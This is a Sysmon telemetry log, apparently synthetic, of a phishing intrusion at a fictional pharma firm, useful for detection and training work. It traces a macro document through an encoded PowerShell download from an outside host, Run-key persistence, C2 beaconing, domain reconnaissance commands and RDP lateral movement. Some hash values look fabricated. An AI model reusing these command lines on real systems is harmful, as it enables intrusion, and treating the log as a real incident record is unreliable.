{"@timestamp":"2024-10-22T08:23:11.300Z","winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":98201,"computer_name":"WS-IT-LEVI.lifetechpharma.local"},"event":{"code":"1"},"process":{"name":"OUTLOOK.EXE","pid":3100,"executable":"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE","command_line":"\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"","parent":{"name":"explorer.exe","pid":1080}},"user":{"name":"p.levi","domain":"LIFETECHPHARMA"},"host":{"name":"WS-IT-LEVI","hostname":"WS-IT-LEVI.lifetechpharma.local"},"rule":{"name":"process_creation"}}
{"@timestamp":"2024-10-22T08:24:02.887Z","winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":11,"record_id":98214,"computer_name":"WS-IT-LEVI.lifetechpharma.local"},"event":{"code":"11"},"file":{"path":"C:\\Users\\p.levi\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\K8M3N1B5\\MFA-ReEnroll-Guide.docm","name":"MFA-ReEnroll-Guide.docm"},"process":{"name":"OUTLOOK.EXE","pid":3100},"user":{"name":"p.levi","domain":"LIFETECHPHARMA"},"host":{"name":"WS-IT-LEVI"},"rule":{"name":"file_create_attachment_download"}}
{"@timestamp":"2024-10-22T08:24:19.550Z","winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":98218,"computer_name":"WS-IT-LEVI.lifetechpharma.local"},"event":{"code":"1"},"process":{"name":"WINWORD.EXE","pid":5200,"executable":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","command_line":"\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" \"C:\\Users\\p.levi\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\K8M3N1B5\\MFA-ReEnroll-Guide.docm\"","parent":{"name":"OUTLOOK.EXE","pid":3100}},"user":{"name":"p.levi","domain":"LIFETECHPHARMA"},"host":{"name":"WS-IT-LEVI"},"rule":{"name":"process_creation"}}
{"@timestamp":"2024-10-22T08:24:44.221Z","winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":98224,"computer_name":"WS-IT-LEVI.lifetechpharma.local"},"event":{"code":"1"},"process":{"name":"wscript.exe","pid":6088,"executable":"C:\\Windows\\System32\\wscript.exe","command_line":"wscript.exe C:\\Users\\p.levi\\AppData\\Local\\Temp\\~WRS{C4D2E1F0}.tmp","hash":{"md5":"2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e","sha256":"f1e2d3c4b5a6978869504132241506f7e8d9c0b1a2938475"},"parent":{"name":"WINWORD.EXE","pid":5200}},"user":{"name":"p.levi","domain":"LIFETECHPHARMA"},"host":{"name":"WS-IT-LEVI"},"rule":{"name":"technique_id=T1059.005,technique_name=Visual_Basic"}}
{"@timestamp":"2024-10-22T08:24:58.104Z","winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":98228,"computer_name":"WS-IT-LEVI.lifetechpharma.local"},"event":{"code":"1"},"process":{"name":"powershell.exe","pid":6400,"executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","command_line":"powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAcwA6AC8ALwB0AGUAbABlAG0AZQB0AHIAeQAtAGMAZABuAC0AcwBlAHIAdgBpAGMAZQBzAC4AYgBpAHoALwBpAG4AaQB0AC4AZQB4AGUA","hash":{"md5":"04029e121a0cfa5991749937dd22a1d9","sha256":"de96a6e69944335375dc1ac238336066889d9ffc7d73628ef4fe1b1b160ab32c"},"parent":{"name":"wscript.exe","pid":6088}},"user":{"name":"p.levi","domain":"LIFETECHPHARMA"},"host":{"name":"WS-IT-LEVI"},"rule":{"name":"technique_id=T1059.001,technique_name=PowerShell"}}
{"@timestamp":"2024-10-22T08:25:04.809Z","winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":11,"record_id":98230,"computer_name":"WS-IT-LEVI.lifetechpharma.local"},"event":{"code":"11"},"file":{"path":"C:\\ProgramData\\Microsoft\\DeviceSync\\dsync.exe","name":"dsync.exe"},"process":{"name":"powershell.exe","pid":6400},"user":{"name":"p.levi","domain":"LIFETECHPHARMA"},"host":{"name":"WS-IT-LEVI"},"rule":{"name":"file_create_suspicious_programdata"}}
{"@timestamp":"2024-10-22T08:25:07.330Z","winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":13,"record_id":98232,"computer_name":"WS-IT-LEVI.lifetechpharma.local"},"event":{"code":"13"},"registry":{"path":"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\DeviceSyncHelper","value":"C:\\ProgramData\\Microsoft\\DeviceSync\\dsync.exe --silent"},"process":{"name":"powershell.exe","pid":6400},"user":{"name":"p.levi","domain":"LIFETECHPHARMA"},"host":{"name":"WS-IT-LEVI"},"rule":{"name":"technique_id=T1547.001,technique_name=Registry_Run_Keys"}}
{"@timestamp":"2024-11-01T06:14:33.000Z","winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":22,"record_id":110041,"computer_name":"WS-IT-LEVI.lifetechpharma.local"},"event":{"code":"22"},"dns":{"question":{"name":"telemetry-cdn-services.biz","type":"A"},"resolved_ip":["203.0.113.87"]},"process":{"name":"dsync.exe","pid":4812,"executable":"C:\\ProgramData\\Microsoft\\DeviceSync\\dsync.exe"},"user":{"name":"p.levi","domain":"LIFETECHPHARMA"},"host":{"name":"WS-IT-LEVI"},"rule":{"name":"technique_id=T1071.004,technique_name=DNS"}}
{"@timestamp":"2024-11-01T06:14:38.220Z","winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":3,"record_id":110044,"computer_name":"WS-IT-LEVI.lifetechpharma.local"},"event":{"code":"3"},"network":{"direction":"egress","transport":"tcp","type":"ipv4"},"destination":{"ip":"203.0.113.87","port":443},"source":{"ip":"10.10.1.77","port":51200},"process":{"name":"dsync.exe","pid":4812},"user":{"name":"p.levi","domain":"LIFETECHPHARMA"},"host":{"name":"WS-IT-LEVI"},"rule":{"name":"c2_first_beacon"}}
{"@timestamp":"2024-11-14T21:08:44.601Z","winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":138800,"computer_name":"WS-IT-LEVI.lifetechpharma.local"},"event":{"code":"1"},"process":{"name":"net.exe","pid":5544,"executable":"C:\\Windows\\System32\\net.exe","command_line":"net group \"Domain Admins\" /domain","parent":{"name":"dsync.exe","pid":4812}},"user":{"name":"p.levi","domain":"LIFETECHPHARMA"},"host":{"name":"WS-IT-LEVI"},"rule":{"name":"technique_id=T1069.002,technique_name=Domain_Groups"}}
{"@timestamp":"2024-11-14T21:09:12.400Z","winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":138804,"computer_name":"WS-IT-LEVI.lifetechpharma.local"},"event":{"code":"1"},"process":{"name":"nltest.exe","pid":5560,"executable":"C:\\Windows\\System32\\nltest.exe","command_line":"nltest.exe /dclist:lifetechpharma.local","parent":{"name":"dsync.exe","pid":4812}},"user":{"name":"p.levi","domain":"LIFETECHPHARMA"},"host":{"name":"WS-IT-LEVI"},"rule":{"name":"technique_id=T1018,technique_name=Remote_System_Discovery"}}
{"@timestamp":"2024-11-14T21:11:03.780Z","winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":138810,"computer_name":"WS-IT-LEVI.lifetechpharma.local"},"event":{"code":"1"},"process":{"name":"cmd.exe","pid":5580,"executable":"C:\\Windows\\System32\\cmd.exe","command_line":"cmd.exe /c for /l %i in (10,1,99) do @ping -n 1 -w 100 10.10.2.%i 2>NUL | findstr TTL","parent":{"name":"dsync.exe","pid":4812}},"user":{"name":"p.levi","domain":"LIFETECHPHARMA"},"host":{"name":"WS-IT-LEVI"},"rule":{"name":"technique_id=T1018,technique_name=Remote_System_Discovery"}}
{"@timestamp":"2024-11-15T18:15:22.100Z","winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":3,"record_id":141088,"computer_name":"WS-IT-LEVI.lifetechpharma.local"},"event":{"code":"3"},"network":{"direction":"egress","transport":"tcp","type":"ipv4"},"destination":{"ip":"10.10.2.41","port":3389},"source":{"ip":"10.10.1.77","port":52100},"process":{"name":"dsync.exe","pid":4812},"user":{"name":"p.levi","domain":"LIFETECHPHARMA"},"host":{"name":"WS-IT-LEVI"},"rule":{"name":"technique_id=T1021.001,technique_name=Remote_Desktop_Protocol"}}
